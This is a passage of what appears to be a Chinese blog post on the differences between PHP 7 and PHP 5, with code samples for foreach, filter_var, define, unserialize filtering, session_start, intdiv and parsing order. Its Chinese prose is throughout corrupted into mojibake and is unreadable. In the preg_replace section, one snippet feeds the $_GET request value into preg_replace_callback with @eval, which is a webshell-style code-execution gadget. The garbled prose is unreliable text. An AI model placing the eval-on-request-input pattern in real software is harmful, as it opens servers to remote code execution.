class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><strong>foreaché€šè¿‡å€¼éå†æ—¶ï¼Œæ“ä½œçš„å€¼ä¸ºæ•°ç»„çš„å‰¯æœ¬</strong></p><p>å½“é»˜è®¤ä½¿ç”¨é€šè¿‡å€¼éå†æ•°ç»„æ—¶ï¼Œ<code>foreach</code>å®é™…æ“ä½œçš„æ˜¯æ•°ç»„çš„è¿­ä»£å‰¯æœ¬ï¼Œè€Œéæ•°ç»„æœ¬èº«ã€‚è¿™å°±æ„å‘³ç€ï¼Œ<code>foreach</code> ä¸­çš„æ“ä½œä¸ä¼šä¿®æ”¹åŸæ•°ç»„çš„å€¼ã€‚</p><p><strong>foreaché€šè¿‡å¼•ç”¨éå†æ—¶ï¼Œæœ‰æ›´å¥½çš„è¿­ä»£ç‰¹æ€§</strong></p><p>å½“ä½¿ç”¨å¼•ç”¨éå†æ•°ç»„æ—¶ï¼Œç°åœ¨ <code>foreach</code>åœ¨è¿­ä»£ä¸­èƒ½æ›´å¥½çš„è·Ÿè¸ªå˜åŒ–ã€‚ä¾‹å¦‚ï¼Œåœ¨è¿­ä»£ä¸­æ·»åŠ ä¸€ä¸ªè¿­ä»£å€¼åˆ°æ•°ç»„ä¸­ï¼Œå‚è€ƒä¸‹é¢çš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span> = [<span class="hljs-number">0</span>];<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$array</span> <span class="hljs-keyword">as</span> &amp;<span class="hljs-variable">$val</span>) &#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$val</span>);<br>    <span class="hljs-variable">$array</span>[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PHP5<br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><br>PHP7<br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br></code></pre></td></tr></table></figure><h2 id="filter-varè½¬æ¢åå…­è¿›åˆ¶æ•°å­—"><a href="#filter-varè½¬æ¢åå…­è¿›åˆ¶æ•°å­—" class="headerlink" title="filter_varè½¬æ¢åå…­è¿›åˆ¶æ•°å­—"></a>filter_varè½¬æ¢åå…­è¿›åˆ¶æ•°å­—</h2><p><code>filter_var</code> å‡½æ•°å¯ä»¥ç”¨äºæ£€æŸ¥ä¸€ä¸ª <code>string</code> æ˜¯å¦å«æœ‰åå…­è¿›åˆ¶æ•°å­—,å¹¶å°†å…¶è½¬æ¢ä¸º<code>integer</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;0xffff&quot;</span>;<br><span class="hljs-variable">$int</span> = <span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$str</span>, FILTER_VALIDATE_INT, FILTER_FLAG_ALLOW_HEX);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> === <span class="hljs-variable">$int</span>) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Invalid integer!&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$int</span>); <span class="hljs-comment">// int(65535)</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="é€šè¿‡-define-å®šä¹‰å¸¸é‡æ•°ç»„"><a href="#é€šè¿‡-define-å®šä¹‰å¸¸é‡æ•°ç»„" class="headerlink" title="é€šè¿‡ define å®šä¹‰å¸¸é‡æ•°ç»„"></a>é€šè¿‡ define å®šä¹‰å¸¸é‡æ•°ç»„</h2><p>Array ç±»å‹çš„å¸¸é‡ç°åœ¨å¯ä»¥é€šè¿‡ <code>define()</code> æ¥å®šä¹‰ã€‚åœ¨ PHP5.6 ä¸­ä»…èƒ½é€šè¿‡ <code>const</code> å®šä¹‰ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>define(<span class="hljs-string">&#x27;ANIMALS&#x27;</span>, [    <span class="hljs-string">&#x27;dog&#x27;</span>,    <span class="hljs-string">&#x27;cat&#x27;</span>,    <span class="hljs-string">&#x27;bird&#x27;</span>]);<span class="hljs-keyword">echo</span> ANIMALS[<span class="hljs-number">1</span>]; <span class="hljs-comment">// è¾“å‡º &quot;cat&quot;?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="ä¸ºunserialize-æä¾›è¿‡æ»¤"><a href="#ä¸ºunserialize-æä¾›è¿‡æ»¤" class="headerlink" title="ä¸ºunserialize()æä¾›è¿‡æ»¤"></a>ä¸ºunserialize()æä¾›è¿‡æ»¤</h2><p>è¿™ä¸ªç‰¹æ€§æ—¨åœ¨æä¾›æ›´å®‰å…¨çš„æ–¹å¼è§£åŒ…ä¸å¯é çš„æ•°æ®ã€‚å®ƒé€šè¿‡ç™½åå•çš„æ–¹å¼æ¥é˜²æ­¢æ½œåœ¨çš„ä»£ç æ³¨å…¥ã€‚</p><p>å¯é€‰ç™½åå•å‚æ•°ä¹Ÿå¯ä»¥æ˜¯å¸ƒå°”æ•°æ®ï¼Œå¦‚æœæ˜¯FALSEå°±ä¼šå°†æ‰€æœ‰çš„å¯¹è±¡éƒ½è½¬æ¢ä¸º<code>__PHP_Incomplete_Class</code>å¯¹è±¡ã€‚TRUEæ˜¯æ— é™åˆ¶ã€‚ä¹Ÿå¯ä»¥ä¼ å…¥ç±»åå®ç°ç™½åå•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">class</span> a&#123;<span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;123&#x27;</span>;&#125;<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>();<span class="hljs-variable">$ser</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<span class="hljs-variable">$unse</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>,[<span class="hljs-string">&quot;allowed_classes&quot;</span> =&gt; <span class="hljs-literal">false</span>]);<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$unse</span>);<span class="hljs-variable">$unse</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>,[<span class="hljs-string">&quot;allowed_classes&quot;</span> =&gt; <span class="hljs-literal">true</span>]);<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$unse</span>);<br></code></pre></td></tr></table></figure><p><img src="/Users/j7ur8/WebBook/BookBuild/images/19-7-22_PHP_PHP7%E5%92%8CPHP5%E7%9A%84%E5%8C%BA%E5%88%AB_%E5%87%BD%E6%95%B0%E6%96%B9%E9%9D%A2_2.png"></p><h2 id="session-startå¯ä»¥åŠ å…¥ä¸€ä¸ªæ•°ç»„"><a href="#session-startå¯ä»¥åŠ å…¥ä¸€ä¸ªæ•°ç»„" class="headerlink" title="session_startå¯ä»¥åŠ å…¥ä¸€ä¸ªæ•°ç»„"></a>session_startå¯ä»¥åŠ å…¥ä¸€ä¸ªæ•°ç»„</h2><p><code>session_start()</code> å¯ä»¥æ¥å—ä¸€ä¸ª <code>array</code> ä½œä¸ºå‚æ•°ï¼Œ ç”¨æ¥è¦†ç›– php.ini æ–‡ä»¶ä¸­è®¾ç½®çš„ <a href="https://www.php.net/manual/zh/session.configuration.php">ä¼šè¯é…ç½®é€‰é¡¹</a>ã€‚</p><p>åœ¨è°ƒç”¨ <code>session_start()</code> çš„æ—¶å€™ï¼Œ ä¼ å…¥çš„é€‰é¡¹å‚æ•°ä¸­ä¹Ÿæ”¯æŒ <code>session.lazy_write</code> è¡Œä¸ºï¼Œ é»˜è®¤æƒ…å†µä¸‹è¿™ä¸ªé…ç½®é¡¹æ˜¯æ‰“å¼€çš„ã€‚å®ƒçš„ä½œç”¨æ˜¯æ§åˆ¶ PHP åªæœ‰åœ¨ä¼šè¯ä¸­çš„æ•°æ®å‘ç”Ÿå˜åŒ–çš„æ—¶å€™æ‰ å†™å…¥ä¼šè¯å­˜å‚¨æ–‡ä»¶ï¼Œå¦‚æœä¼šè¯ä¸­çš„æ•°æ®æ²¡æœ‰å‘ç”Ÿæ”¹å˜ï¼Œé‚£ä¹ˆ PHP ä¼šåœ¨è¯»å–å®Œä¼šè¯æ•°æ®ä¹‹åï¼Œ ç«‹å³å…³é—­ä¼šè¯å­˜å‚¨æ–‡ä»¶ï¼Œä¸åšä»»ä½•ä¿®æ”¹ï¼Œå¯ä»¥é€šè¿‡è®¾ç½® <code>read_and_close</code>æ¥å®ç°ã€‚</p><p>ä¾‹å¦‚ï¼Œä¸‹åˆ—ä»£ç è®¾ç½® <code>session.cache_limiter</code> ä¸º <em>private</em>ï¼Œå¹¶ä¸”åœ¨è¯»å–å®Œæ¯•ä¼šè¯æ•°æ®ä¹‹åé©¬ä¸Šå…³é—­ä¼šè¯å­˜å‚¨æ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>session_start([    <span class="hljs-string">&#x27;cache_limiter&#x27;</span> =&gt; <span class="hljs-string">&#x27;private&#x27;</span>,    <span class="hljs-string">&#x27;read_and_close&#x27;</span> =&gt; <span class="hljs-literal">true</span>,]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="preg-replacesä¸å†æ”¯æŒ-eä¿®é¥°ç¬¦"><a href="#preg-replacesä¸å†æ”¯æŒ-eä¿®é¥°ç¬¦" class="headerlink" title="preg_replacesä¸å†æ”¯æŒ&#x2F;eä¿®é¥°ç¬¦"></a>preg_replacesä¸å†æ”¯æŒ&#x2F;eä¿®é¥°ç¬¦</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;h&quot;</span>]=<span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-title function_ invoke__">preg_replace_callback</span>(<span class="hljs-string">&quot;/.*/&quot;</span>,function (<span class="hljs-variable">$a</span>)&#123;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]);&#125;,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;h&quot;</span>]);<br></code></pre></td></tr></table></figure><p><img src="/Users/j7ur8/WebBook/BookBuild/images/19-7-22_PHP_PHP7%E5%92%8CPHP5%E7%9A%84%E5%8C%BA%E5%88%AB_%E5%87%BD%E6%95%B0%E6%96%B9%E9%9D%A2_1.png"></p><p>ä½†æ˜¯æœ‰æ–°çš„å‡½æ•°<code>preg_replace_callback</code></p><h2 id="dirnameå¢åŠ äº†å‚æ•°"><a href="#dirnameå¢åŠ äº†å‚æ•°" class="headerlink" title="dirnameå¢åŠ äº†å‚æ•°"></a>dirnameå¢åŠ äº†å‚æ•°</h2><p><code>dirname()</code> å¢åŠ äº†å¯é€‰çš„ç¬¬äºŒä¸ªå‚æ•°, <code>depth</code>, è·å–å½“å‰ç›®å½•å‘ä¸Š <code>depth</code> çº§çˆ¶ç›®å½•çš„åç§°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-string">&#x27;c:/a/b/c/d&#x27;</span>,<span class="hljs-number">1</span>);<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">#ç»“æœ/*c:/a/b/c*/</span><br></code></pre></td></tr></table></figure><h2 id="systemç­‰å‡½æ•°å¯¹NULLå¢åŠ äº†ä¿æŠ¤"><a href="#systemç­‰å‡½æ•°å¯¹NULLå¢åŠ äº†ä¿æŠ¤" class="headerlink" title="systemç­‰å‡½æ•°å¯¹NULLå¢åŠ äº†ä¿æŠ¤."></a>systemç­‰å‡½æ•°å¯¹NULLå¢åŠ äº†ä¿æŠ¤.</h2><p><code>exec()</code>, <code>system()</code> and <code>passthru()</code> å‡½æ•°å¯¹ NULL å¢åŠ äº†ä¿æŠ¤ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“å•¥æ„æ€ã€‚</p><h2 id="å¢åŠ æ•´æ•°é™¤æ³•å‡½æ•°-intdiv"><a href="#å¢åŠ æ•´æ•°é™¤æ³•å‡½æ•°-intdiv" class="headerlink" title="å¢åŠ æ•´æ•°é™¤æ³•å‡½æ•° intdiv"></a>å¢åŠ æ•´æ•°é™¤æ³•å‡½æ•° intdiv</h2><p>æ–°åŠ çš„å‡½æ•° <code>intdiv()</code> ç”¨æ¥è¿›è¡Œ æ•´æ•°çš„é™¤æ³•è¿ç®—ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>var_dump(<span class="hljs-title function_ invoke__">intdiv</span>(<span class="hljs-number">10</span>, <span class="hljs-number">3</span>));<span class="hljs-comment">// int(3)?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="å¢åŠ preg-replace-callback-array"><a href="#å¢åŠ preg-replace-callback-array" class="headerlink" title="å¢åŠ preg_replace_callback_array"></a>å¢åŠ preg_replace_callback_array</h2><p>åœ¨ PHP 7 ä¹‹å‰ï¼Œå½“ä½¿ç”¨ <code>preg_replace_callback()</code> å‡½æ•°çš„æ—¶å€™ï¼Œ ç”±äºé’ˆå¯¹æ¯ä¸ªæ­£åˆ™è¡¨è¾¾å¼éƒ½è¦æ‰§è¡Œå›è°ƒå‡½æ•°ï¼Œå¯èƒ½å¯¼è‡´è¿‡å¤šçš„åˆ†æ”¯ä»£ç ã€‚ è€Œä½¿ç”¨æ–°åŠ çš„ <code>preg_replace_callback_array()</code> å‡½æ•°ï¼Œ å¯ä»¥ä½¿å¾—ä»£ç æ›´åŠ ç®€æ´ã€‚</p><p>ç°åœ¨ï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªå…³è”æ•°ç»„æ¥å¯¹æ¯ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ³¨å†Œå›è°ƒå‡½æ•°ï¼Œ æ­£åˆ™è¡¨è¾¾å¼æœ¬èº«ä½œä¸ºå…³è”æ•°ç»„çš„é”®ï¼Œ è€Œå¯¹åº”çš„å›è°ƒå‡½æ•°å°±æ˜¯å…³è”æ•°ç»„çš„å€¼ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$subject</span> = <span class="hljs-string">&#x27;Aaaaaa Bbb&#x27;</span>;<span class="hljs-title function_ invoke__">preg_replace_callback_array</span>(    [        <span class="hljs-string">&#x27;~[a]+~i&#x27;</span> =&gt; function (<span class="hljs-variable">$match</span>) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$match</span>[<span class="hljs-number">0</span>]), <span class="hljs-string">&#x27; matches for &quot;a&quot; found&#x27;</span>, PHP_EOL;        &#125;,        <span class="hljs-string">&#x27;~[b]+~i&#x27;</span> =&gt; <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$match</span></span>) </span>&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$match</span>[<span class="hljs-number">0</span>]), <span class="hljs-string">&#x27; matches for &quot;b&quot; found&#x27;</span>, PHP_EOL;        &#125;    ],    <span class="hljs-variable">$subject</span>);    <span class="hljs-comment">/*6 matches for &quot;a&quot; found3 matches for &quot;b&quot; found*/</span><br></code></pre></td></tr></table></figure><h2 id="å¢åŠ Closure-call"><a href="#å¢åŠ Closure-call" class="headerlink" title="å¢åŠ Closure::call()"></a>å¢åŠ Closure::call()</h2><p><strong>Closure::call()</strong> ç°åœ¨æœ‰ç€æ›´å¥½çš„æ€§èƒ½ï¼Œç®€çŸ­å¹²ç»ƒçš„æš‚æ—¶ç»‘å®šä¸€ä¸ªæ–¹æ³•åˆ°å¯¹è±¡ä¸Šé—­åŒ…å¹¶è°ƒç”¨å®ƒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">class</span> A &#123;<span class="hljs-keyword">private</span> <span class="hljs-variable">$x</span> = <span class="hljs-number">1</span>;&#125;<span class="hljs-comment">// PHP 7 ä¹‹å‰ç‰ˆæœ¬çš„ä»£ç $getXCB = function() &#123;return $this-&gt;x;&#125;;$getX = $getXCB-&gt;bindTo(new A, &#x27;A&#x27;); // ä¸­é—´å±‚é—­åŒ…echo $getX();// PHP 7+ åŠæ›´é«˜ç‰ˆæœ¬çš„ä»£ç $getX = function() &#123;return $this-&gt;x;&#125;;echo $getX-&gt;call(new A);#ç»“æœ/*11*/</span><br></code></pre></td></tr></table></figure><h2 id="è¢«ç§»é™¤çš„å‡½æ•°"><a href="#è¢«ç§»é™¤çš„å‡½æ•°" class="headerlink" title="è¢«ç§»é™¤çš„å‡½æ•°"></a>è¢«ç§»é™¤çš„å‡½æ•°</h2><ul><li><p><code>call_user_method</code>å’Œ<code>call_user_method_array</code></p></li><li><p>æ‰€æœ‰çš„<code>ereg*</code>å‡½æ•°</p></li><li><p><code>mcrypt</code>çš„ä¸€éƒ¨åˆ†åºŸå¼ƒå‡½æ•°</p></li><li><p>æ‰€æœ‰<code>ext/mysql</code>å‡½æ•°</p></li><li><p>æ‰€æœ‰<code>ext/mssql</code>å‡½æ•°</p></li><li><p>dl in PHP-FPM</p><p>dl()åœ¨ PHP-FPM ä¸å†å¯ç”¨ï¼Œåœ¨ CLI å’Œ embed SAPIs ä¸­ä»å¯ç”¨ã€‚</p></li></ul><h1 id="è¯­æ³•å˜æ›´"><a href="#è¯­æ³•å˜æ›´" class="headerlink" title="è¯­æ³•å˜æ›´"></a>è¯­æ³•å˜æ›´</h1><h2 id="å…³äºå˜é‡å¤„ç†çš„å˜åŒ–"><a href="#å…³äºå˜é‡å¤„ç†çš„å˜åŒ–" class="headerlink" title="å…³äºå˜é‡å¤„ç†çš„å˜åŒ–"></a>å…³äºå˜é‡å¤„ç†çš„å˜åŒ–</h2><p>PHP 7 ç°åœ¨ä½¿ç”¨äº†æŠ½è±¡è¯­æ³•æ ‘æ¥è§£ææºä»£ç ã€‚è¿™ä½¿å¾—è®¸å¤šç”±äºä¹‹å‰çš„PHPçš„è§£é‡Šå™¨çš„é™åˆ¶æ‰€ä¸å¯èƒ½å®ç°çš„æ”¹è¿›å¾—ä»¥å®ç°ã€‚ ä½†å‡ºäºä¸€è‡´æ€§çš„åŸå› å¯¼è‡´äº†ä¸€äº›ç‰¹æ®Šä¾‹å­çš„å˜åŠ¨ï¼Œè€Œè¿™äº›å˜åŠ¨æ‰“ç ´äº†å‘åå…¼å®¹ã€‚ åœ¨è¿™ä¸€ç« ä¸­å°†è¯¦ç»†ä»‹ç»è¿™äº›ä¾‹å­ã€‚</p><h2 id="å…³äºé—´æ¥ä½¿ç”¨å˜é‡ã€å±æ€§å’Œæ–¹æ³•çš„å˜åŒ–"><a href="#å…³äºé—´æ¥ä½¿ç”¨å˜é‡ã€å±æ€§å’Œæ–¹æ³•çš„å˜åŒ–" class="headerlink" title="å…³äºé—´æ¥ä½¿ç”¨å˜é‡ã€å±æ€§å’Œæ–¹æ³•çš„å˜åŒ–"></a>å…³äºé—´æ¥ä½¿ç”¨å˜é‡ã€å±æ€§å’Œæ–¹æ³•çš„å˜åŒ–</h2><p>å¯¹å˜é‡ã€å±æ€§å’Œæ–¹æ³•çš„é—´æ¥è°ƒç”¨ç°åœ¨å°†ä¸¥æ ¼éµå¾ªä»å·¦åˆ°å³çš„é¡ºåºæ¥è§£æï¼Œè€Œä¸æ˜¯ä¹‹å‰çš„æ··æ‚ç€å‡ ä¸ªç‰¹æ®Šæ¡ˆä¾‹çš„æƒ…å†µã€‚ ä¸‹é¢è¿™å¼ è¡¨è¯´æ˜äº†è¿™ä¸ªè§£æé¡ºåºçš„å˜åŒ–ã€‚</p><p>â€‹<strong>é—´æ¥è°ƒç”¨çš„è¡¨è¾¾å¼çš„æ–°æ—§è§£æé¡ºåº</strong></p><table><thead><tr><th align="left">è¡¨è¾¾å¼</th><th align="left">PHP 5 çš„è§£ææ–¹å¼</th><th align="left">PHP 7 çš„è§£ææ–¹å¼</th></tr></thead><tbody><tr><td align="left"><code>$$foo[&#39;bar&#39;][&#39;baz&#39;]</code></td><td align="left"><code>$&#123;$foo[&#39;bar&#39;][&#39;baz&#39;]&#125;</code></td><td align="left"><code>($$foo)[&#39;bar&#39;][&#39;baz&#39;]</code></td></tr><tr><td align="left"><code>$foo-&gt;$bar[&#39;baz&#39;]</code></td><td align="left"><code>$foo-&gt;&#123;$bar[&#39;baz&#39;]&#125;</code></td><td align="left"><code>($foo-&gt;$bar)[&#39;baz&#39;]</code></td></tr><tr><td align="left"><code>$foo-&gt;$bar[&#39;baz&#39;]()</code></td><td align="left"><code>$foo-&gt;&#123;$bar[&#39;baz&#39;]&#125;()</code></td><td align="left"><code>($foo-&gt;$bar)[&#39;baz&#39;]()</code></td></tr><tr><td align="left"><code>Foo::$bar[&#39;baz&#39;]()</code></td><td align="left"><code>Foo::&#123;$bar[&#39;baz&#39;]&#125;()</code></td><td align="left"><code>(Foo::$bar)[&#39;baz&#39;]()</code></td></tr></tbody></table><p>ä½¿ç”¨äº†æ—§çš„ä»å³åˆ°å·¦çš„è§£æé¡ºåºçš„ä»£ç å¿…é¡»è¢«é‡å†™ï¼Œæ˜ç¡®çš„ä½¿ç”¨å¤§æ‹¬å·æ¥è¡¨æ˜é¡ºåºï¼ˆå‚è§ä¸Šè¡¨ä¸­é—´ä¸€åˆ—ï¼‰ã€‚ è¿™æ ·ä½¿å¾—ä»£ç æ—¢ä¿æŒäº†ä¸PHP 7.xçš„å‰å‘å…¼å®¹æ€§ï¼Œåˆä¿æŒäº†ä¸PHP 5.xçš„åå‘å…¼å®¹æ€§ã€‚</p><p>è¿™åŒæ ·å½±å“äº†<a href="https://www.php.net/manual/zh/language.variables.scope.php#language.variables.scope.global"><strong>global</strong></a> å…³é”®å­—ã€‚å¦‚æœéœ€è¦çš„è¯å¯ä»¥ä½¿ç”¨å¤§æ‹¬å·æ¥æ¨¡æ‹Ÿä¹‹å‰çš„è¡Œä¸ºã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">// Valid in PHP 5 only.</span><br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$$foo</span>-&gt;bar;<br><br>    <span class="hljs-comment">// Valid in PHP 5 and 7.</span><br>    <span class="hljs-keyword">global</span> $&#123;<span class="hljs-variable">$foo</span>-&gt;bar&#125;;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="8è¿›åˆ¶å­—ç¬¦å®¹é”™ç‡é™ä½"><a href="#8è¿›åˆ¶å­—ç¬¦å®¹é”™ç‡é™ä½" class="headerlink" title="8è¿›åˆ¶å­—ç¬¦å®¹é”™ç‡é™ä½"></a>8è¿›åˆ¶å­—ç¬¦å®¹é”™ç‡é™ä½</h2><p>åœ¨php5ç‰ˆæœ¬ï¼Œå¦‚æœä¸€ä¸ªå…«è¿›åˆ¶å­—ç¬¦å¦‚æœå«æœ‰æ— æ•ˆæ•°å­—ï¼Œè¯¥æ— æ•ˆæ•°å­—å°†è¢«é™é»˜åˆ èŠ‚ã€‚ä½†æ˜¯åœ¨php7.0.0é‡Œé¢ä¼šè§¦å‘ä¸€ä¸ªè§£æé”™è¯¯ã€‚åŒæ ·åœ¨php7.0.0ä»¥åè¢«æ”¹å›å»ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// åœ¨php5å’Œphp7.0.0ä¹‹å¤–çš„ç‰ˆæœ¬æµ‹è¯•ç»“æœåº”è¯¥å¦‚ä¸‹</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">octdec</span>( <span class="hljs-string">&#x27;012999999999999&#x27;</span> ) . <span class="hljs-string">&quot;\n&quot;</span>;    <span class="hljs-comment">// 10</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">octdec</span>( <span class="hljs-string">&#x27;012&#x27;</span> ) . <span class="hljs-string">&quot;\n&quot;</span>;                <span class="hljs-comment">// 10</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">octdec</span>( <span class="hljs-string">&#x27;012999999999999&#x27;</span> )==<span class="hljs-title function_ invoke__">octdec</span>( <span class="hljs-string">&#x27;012&#x27;</span> ))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;: )&quot;</span>. <span class="hljs-string">&quot;\n&quot;</span>;                   <span class="hljs-comment">// : )</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="è´Ÿä½ç§»è¿ç®—"><a href="#è´Ÿä½ç§»è¿ç®—" class="headerlink" title="è´Ÿä½ç§»è¿ç®—"></a>è´Ÿä½ç§»è¿ç®—</h2><p>ä»¥è´Ÿæ•°å½¢å¼è¿›è¡Œçš„ä½ç§»è¿ç®—å°†ä¼šæŠ›å‡ºä¸€ä¸ª <strong>ArithmeticError</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-number">1</span> &gt;&gt; -<span class="hljs-number">1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stata">PHP5<br>int(0)<br><br>PHP7<br>Fatal <span class="hljs-keyword">error</span>: Uncaught ArithmeticError: Bit shift <span class="hljs-keyword">by</span> negative number <span class="hljs-keyword">in</span> /tmp/<span class="hljs-keyword">test</span>.php:2<br><span class="hljs-keyword">Stack</span> trace:<br>#0 &#123;main&#125;<br>  thrown <span class="hljs-keyword">in</span> /tmp/<span class="hljs-keyword">test</span>.php <span class="hljs-keyword">on</span> <span class="hljs-keyword">line</span> 2<br><br></code></pre></td></tr></table></figure><h2 id="è¶…èŒƒå›´åäº§ç”Ÿä½ç§»"><a href="#è¶…èŒƒå›´åäº§ç”Ÿä½ç§»" class="headerlink" title="è¶…èŒƒå›´åäº§ç”Ÿä½ç§»"></a>è¶…èŒƒå›´åäº§ç”Ÿä½ç§»</h2><p>è¶…å‡º <code>integer</code>ä½å®½çš„ä½ç§»æ“ä½œï¼ˆæ— è®ºå“ªä¸ªæ–¹å‘ï¼‰å°†å§‹ç»ˆå¾—åˆ° 0 ä½œä¸ºç»“æœã€‚åœ¨ä»å‰ï¼Œè¿™ä¸€æ“ä½œæ˜¯ç»“æ„ä¾èµ–çš„</p><h2 id="åå…­è¿›åˆ¶å­—ç¬¦ä¸²è§„èŒƒ"><a href="#åå…­è¿›åˆ¶å­—ç¬¦ä¸²è§„èŒƒ" class="headerlink" 